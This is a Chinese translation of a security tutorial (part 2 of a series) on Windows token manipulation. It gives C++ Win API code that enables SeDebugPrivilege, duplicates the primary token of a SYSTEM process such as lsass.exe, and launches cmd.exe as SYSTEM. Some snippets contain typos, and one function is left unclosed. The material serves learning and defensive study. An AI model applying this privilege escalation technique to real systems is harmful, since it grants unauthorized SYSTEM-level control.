# 详解令牌篡改攻击（Part 2）

阅读量 **1269062**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-11-29 11:30:00

 **x**

##### 译文声明

本文是翻译文章，文章原作者 niiconsulting，文章来源：niiconsulting.com

原文地址：<https://niiconsulting.com/checkmate/2019/11/token-manipulation-attacks-part-2-process-of-impersonation/>

译文仅供参考，具体内容表达以及含义原文为准。

## 0x00 前言

在前篇文章中（[原文](https://niiconsulting.com/checkmate/2019/11/token-manipulation-attacks-part-1-introduction-to-tokens-and-privileges/)，[译文](https://www.anquanke.com/post/id/192892)），我们讨论了系统赋予用户的令牌（Token）及特权（Privilege）相关基础知识。在这篇文章中，我们来讨论令牌篡改攻击（Token
Manipulation Attack）的相关技术。为了演示攻击过程，这里我们使用的是C++版的Win API。

## 0x01 相关技术

**技术1：** 以运行在`SYSTEM`安全上下文中的进程为目标，复制该进程的主令牌（Primary
Token），创建具备`SYSTEM`级别特权的进程。

创建具备较高特权进程的步骤如下图所示：

![](https://p2.ssl.qhimg.com/t017ac129c278ab762e.png)

由于我们希望创建具备`SYSTEM`级别特权的进程，因此我们需要访问运行在`SYSTEM`账户下的某个进程。在Windows中，我们无法通过运行在另一个较低特权用户下的进程来访问`SYSTEM`级别的进程。为了访问`SYSTEM`进程，调用方进程令牌中必须启用`SE_DEBUG_NAME`特权。

在前一篇文章中，我们知道标准用户并不能使用这些“上帝模式”特权，而位于管理员组且具有提升令牌（Elevated
Token）的用户可以使用这些“上帝模式”特权。因此，为了完成该任务，我们需要满足一个条件：用户必须位于管理员组中。这意味着我们必须通过某种方式（比如绕过UAC或者其他漏洞）获取高级别用户访问权限。

> 备注：2017年，来自Google Project Zero的[James
> Forshaw](https://twitter.com/tiraniddo)做过关于“滥用访问令牌绕过UAC”的演讲，其中Forshaw成功从未提升进程中复制了已提升进程的令牌。微软在2018年10月份修复了该bug，Forshaw也在后续[文章](https://tyranidslair.blogspot.com/2018/10/farewell-> to-token-stealing-uac-> bypass.html)中确认了这一点。大家可以参考这3篇文章（[[1]](https://tyranidslair.blogspot.com/2017/05/reading-> your-way-around-uac-> part-1.html)、[[2]](https://tyranidslair.blogspot.com/2017/05/reading-your-> way-around-uac-> part-2.html)、[[3]](https://tyranidslair.blogspot.com/2017/05/reading-your-> way-around-uac-part-3.html)）了解更多信息。

一旦用户位于管理员组，我们就可以启用`SE_DEBUG_NAME`特权。对于管理员组中的用户，该特权默认情况下处于禁用状态，但对于本地系统，该特权默认处于启用状态。

为当前进程启用该特权的代码如下所示：

    
    
    BOOL EnableTokenPrivilege(LPTSTR LPrivilege)
    {
        TOKEN_PRIVILEGES tokenpriv;
        BOOL bResult = FALSE;
        HANDLE hToken = NULL;
        DWORD dwSize;
    
        ZeroMemory(&tokenpriv, sizeof(tokenpriv));
        tokenpriv.PrivilegeCount = 1;
    
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) && LookupPrivilegeValue(NULL, LPrivilegeSE_DEBUG_NAME, &tokenpriv.Privileges[0].Luid))
        {
            tokenprivp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            bResult = AdjustTokenPrivileges(hToken, FALSE, &tokenpriv, 0, NULL, NULL);
        }
        else
        {
            _tprintf(L"Open Process Token Failed with Error Code: %d\n", GetLastError());
        }
    
        CloseHandle(hToken);
    
        return bResult;
    

代码执行的步骤如下：

1、以参数形式传入我们希望启用的特权，然后声明一个[TOKEN_PRIVILEGES](https://docs.microsoft.com/is-is/windows/win32/api/winnt/ns-winnt-token_privileges)结构（`tokenpriv`），该结构中包含与令牌有关的特权信息。

2、然后使用[OpenProcessToken()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)打开当前进程的令牌，将返回的句柄保存在`hToken`句柄中（我们没有使用`OpenProcess()`来打开进程句柄，而是通过[GetCurrentProcess()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)函数直接访问当前进程）。

3、使用`LookupPrivilegeValue()`函数获取指定特权的[LUID](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid)值（本地系统利用该值来识别特权）。我们将LUID值保存到之前声明的`tokenpriv`结构中。

4、如果`OpenProcessToken()`及[LookupPrivilegeValue()](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea)都执行成功，那么我们将`tokenpriv`结构的`Privilege`属性设置为`SE_PRIVILEGE_ENABLED`，准备启用该特权。

5、然后使用[AdjustTokenPrivileges()](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges)函数，为指定令牌启用该特权。我们以参数形式传入令牌句柄`hToken`以及`TOKEN_PRIVILEGES`结构（其中包含相应的特权及属性），如果函数执行成功，那么指定的特权就会被成功启用。

当Debug特权启用后，现在我们可以打开`SYSTEM`级进程的句柄，相应的代码片段如下所示：

    
    
    HANDLE hProcess = NULL;
    int pid = _wtoi(argv[1]);
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!hProcess)
    {
            _tprintf(L"Cannot Open Process. Failed with Error Code: %d\n", GetLastError());
            CloseHandle(hProcess);
    }
    

代码执行如下操作：

1、声明句柄`HANDLE hProcess`，以保存进程句柄。

2、使用`OpenProcess()`函数打开通过`pid`变量指定的进程ID所对应的句柄，`pid`值可直接设定，或者作为用户输入传入。这里我们以命令行参数形式传入该值。

3、在`OpenProcess()`函数中，第一个参数为希望获取的访问权限。这里我们使用的是`PROCESS_QUERY_INFORMATION`，以获取诸如令牌、退出代码以及优先等级之类的信息。如果大家想了解打开进程句柄时可以使用的进程安全特性及访问权限，可参考[此处](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)了解更多信息。我们需要根据具体需求使用相应的访问权限。

4、如果函数执行成功，我们就可以在`HANDLE hProcess`中获取指定进程的句柄。

接下来就是从已打开的进程句柄中打开进程令牌。我们的主要任务是打开目标进程的进程令牌，复制该令牌，使用复制的令牌创建一个新的进程。令牌同样具有安全权限以及访问参数，这些信息用来定义我们需要获取的访问级别。

打开进程令牌的代码片段如下所示：

    
    
    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken))
    {
        _tprintf(L"Cannot Open Process Token. Failed with Error Code: %d\n", GetLastError());
        CloseHandle(hToken);
      CloseHandle(hProcess);
    }
    

步骤如下：

1、声明`HANDLE
hToken`，用来保存令牌句柄，然后使用`OpenProcessToken()`函数打开指定进程的令牌。在进程句柄参数中，我们传入`hProcess`句柄，该句柄来自于`OpenProcess()`函数。

2、在第二个参数中，我们需要使用复制令牌所需的权限。这里我们指定的是`TOKEN_QUERY`以及`TOKEN_DUPLICATE`访问标志，以便复制所需的`Primary`令牌。

> 备注：
>
>   * `TOKEN_QUERY`：用来查询访问令牌
>   * `TOKEN_DUPLICATE`：用来复制访问令牌
>

3、传入`hToken`，以保存返回的令牌句柄。如果`OpenProcessToken()`函数执行成功，那么`hToken`句柄中将保存目标信息。

现在我们的主要任务是从已打开的令牌句柄中复制`Primary`令牌，为了完成该任务，我们可以声明一个新的`HANDLE`，用来保存复制令牌。为了复制目标令牌，我们可以使用`DuplicateTokenEx()`函数。

根据微软文档，[DuplicateTokenEx()](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)函数的原型如下所示：

![](https://p3.ssl.qhimg.com/t01fb38a9c81d3a9412.png)

现在我们已经通过`OpenProcessToken()`函数拿到一个令牌句柄（`hToken`），对于`dwDesiredAccess`参数，这里我们可以使用`MAXIMUM_ALLOWED`，这样就可以使用与已打开令牌对应的所有可用的访问权限。对于安全属性参数，我们传入`NULL`，使用默认的安全描述符。

现在我们需要定义模拟（Impersonation）级别，用来定义我们可以在哪个级别上模拟目标进程。

![](https://p5.ssl.qhimg.com/t010323718741e02a43.png)

我们希望在本地系统上模拟目标进程的安全上下文，因此根据上述常量，这里我们可以使用`SecurityImpersonation`常量作为模拟级别，这里需要使用`SECURITY_IMPERSONATION_LEVEL`枚举类型。

接下来我们需要指定待复制的令牌类型。在Part
1中，我们知道令牌包括两种类型：`Primary`以及`Impersonation`令牌。由于我们正在创建一个新进程，因此需要使用`Primary`令牌。其实我们还可以使用`Impersonation`令牌来创建一个新的进程，因为`DuplicateTokenEx()`函数会帮我们将`Impersonation`令牌转换为`Primary`令牌。然而，当我们想模拟某个进程，而不单单是创建新进程时，我们必须使用`Impersonation`令牌。这里我们需要使用`TOKEN_TYPE`枚举类型。

使用`DuplicateTokenEx()`函数的代码片段如下所示：

    
    
    HANDLE NewToken = NULL;
    BOOL DuplicateTokenResult = FALSE;
    SECURITY_IMPERSONATION_LEVEL Sec_Imp_Level = SecurityImpersonation;
    TOKEN_TYPE token_type = TokenPrimary;
    DuplicateTokenResult = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, Sec_Imp_Level, token_type, &NewToken);
    
    if (!DuplicateTokenResult)
    {
        _tprintf(L"Duplicate Token Failed with Error Code: %d\n", GetLastError());
        CloseHandle(hToken);
          CloseHandle(NewToken);
    }
    

这里我们使用`Sec_Imp_Level`（`SECURITY_IMPERSONATION_LEVEL`枚举类型）来定义模拟级别（`SecurityImpersonation`），然后使用`token_type`（`TOKEN_TYPE`枚举类型）将令牌类型定义为`TokenPrimary`。对于最后一个参数，我们使用的是`NewToken`新令牌句柄，用来接收复制的新令牌。

如果函数执行成功，`HANDLE NewToken`将保存新复制的令牌。

完成令牌复制过程后，我们将使用新复制的令牌创建一个新进程，这里我们使用的是`CreateProcessWithTokenW()`函数。

根据微软文档， [CreateProcessWithTokenW()](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)函数原型如下所示：

![](https://p2.ssl.qhimg.com/t01f5aad95fa21e1d3d.png)

根据函数原型，我们需要提供`NewToken`句柄（也就是已复制的令牌）。然而根据官方文档，该令牌必须具备`TOKEN_QUERY`、`TOKEN_DUPLICATE`及`TOKEN_ASSIGN_PRIMARY`访问权限。如果我们观察上文的`OpenProcessToken()`代码，会发现我们只设置了`TOKEN_QUERY`及`TOKEN_DUPLICATE`访问权限，然而在`DuplicateTokenEx()`代码中，我们使用了`MAXIMUM_ALLOWED`访问权限，这样就能使用正在复制令牌的所有访问权限，其中就包含`TOKEN_ASSIGN_PRIMARY`访问权限。如果令牌句柄中不存在`TOKEN_ASSIGN_PRIMARY`访问权限，那么就会出现拒绝访问错误，无法成功创建进程。

使用`CreateProcessWithTokenW()`函数的代码片段如下所示：

    
    
    STARTUPINFOEX startup_info = {};
    PROCESS_INFORMATION process_info = {};
    BOOL CreateProcTokenRes = FALSE;
    
    CreateProcTokenRes = CreateProcessWithTokenW(NewToken, 0, L"C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startup_info, &process_info);
    
    if (!CreateProcTokenRes)
    {
        _tprintf(L"Cannot Create Process With Token. Failed with Error Code: %d\n", GetLastError());
        CloseHandle(NewToken);
    }
    

在该函数的`lpApplicationName`参数中，我们传入希望运行在新令牌安全上下文中的应用名称。这里我们以`cmd.exe`为例，使用新令牌创建一个新的`cmd.exe`进程。

在代码开头处我们声明了两个结构：`startup_info`及`process_info`。`STARTUPINFOEX`结构用来指定新进程的属性。比如，我们可以修改进程的父进程、设置进程是否具有子进程等。如果想设置进程属性，我们可以使用`InitializeProcThreadAttributeList()`及`UpdateProcThreadAttribute()`这两个函数（现在我们还不需要修改相关属性）。`PROCESS_INFORMATION`结构用来接收进程相关信息，比如进程及线程句柄、进程ID、线程ID等。

如果函数成功执行，那么我们就可以在新令牌的安全上下文中启动新的CMD进程，而新令牌源自于已有的某个`SYSTEM`进程。

执行结果如下所示：

![](https://p2.ssl.qhimg.com/t01fc28e3bea7e4afe7.png)

在上图中，`652`为`lsass.exe`的进程ID，该进程未经保护，运行在`SYSTEM`安全上下文中。如上图所示，调用方用户运行在`Subzero0x9`用户的安全上下文中，该用户为具备提升令牌的标准用户。该进程并没有启用`SeDebug`特权，因此我们首先启用debug特权，然后完成令牌篡改攻击。一旦程序成功执行，就会弹出新的CMD窗口，且目标进程运行在`nt
authority\system`（即`SYSTEM`）安全上下文中。

现在我们可以使用Process Explorer工具，查看新生成进程的相关信息，如下图所示：

![](https://p3.ssl.qhimg.com/t01af1a2f74a29eecb5.png)

![](https://p1.ssl.qhimg.com/t0147218cb79cc130cc.png)

我们新生成的`cmd.exe`进程的`PID`为`2732`，该进程对应的用户为`SYSTEM`，这意味着该进程运行在`SYSTEM`的安全上下文中。此外，我们还可以看到新生成进程的`SID`、登录会话以及已启用的特权，这些信息与`SYSTEM`级别的进程保持一致。

## 0x03 总结

在本文中，我们探索了在`SYSTEM`安全上下文中创建进程的相关技术，通过打开`SYSTEM`级别进程的句柄，复制目标令牌，然后使用已复制的令牌生成新的CMD进程。在这种场景中，我们重点关注的是进程的`Primary`令牌。在下文中，我们将探索模拟令牌的其他技术。

本文翻译自niiconsulting.com
[原文链接](https://niiconsulting.com/checkmate/2019/11/token-manipulation-attacks-part-2-process-of-impersonation/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/193843](/post/id/193843)

安全客 - 有思想的安全新媒体

本文转载自: [niiconsulting.com](https://niiconsulting.com/checkmate/2019/11/token-manipulation-attacks-part-2-process-of-impersonation/)

如若转载,请注明出处： <https://niiconsulting.com/checkmate/2019/11/token-manipulation-attacks-part-2-process-of-impersonation/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Windows](/tag/Windows)
  * [令牌](/tag/令牌)

 **+1** __4赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

